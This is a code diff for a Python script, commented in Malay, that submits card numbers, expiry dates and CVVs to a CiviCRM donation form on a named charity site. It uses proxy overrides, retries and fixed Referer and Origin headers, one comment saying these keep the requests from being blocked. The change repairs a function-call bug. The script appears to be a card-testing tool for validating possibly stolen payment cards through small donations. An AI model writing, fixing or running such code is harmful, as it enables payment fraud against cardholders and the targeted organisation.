@@ -326,7 +326,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
         final_payload["billing_postal_code-5"] = user_data['postal_code']
     else:
         final_payload["qfKey"] = qfkey
-        # FIX ENTRY URL SUPAYA SAMA PERSIS MACAM YANG AWAK BG (TANPA QFKEY DLM URL)
         final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
         final_payload["hidden_processor"] = "1"
         final_payload["payment_processor_id"] = "4"
@@ -367,9 +366,9 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
     for attempt in range(3):
         try:
-            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, detected_price, is_confirm=False)
+            # BETULKAN ERROR DISINI: Buang base_url dari positional argument
+            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=False)
 
-            # FIX: LOCK REFERER & ORIGIN STATIK KAT SINI SUPAYA TAK KENA BLOCK
             session.headers.update({
                 "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                 "Origin": "https://www.saharaaa.org",
@@ -404,7 +403,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                     "Referer": response.url
                 })
 
-                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, base_url, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
+                # BETULKAN ERROR DISINI: Buang base_url dari positional argument
+                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
                 confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
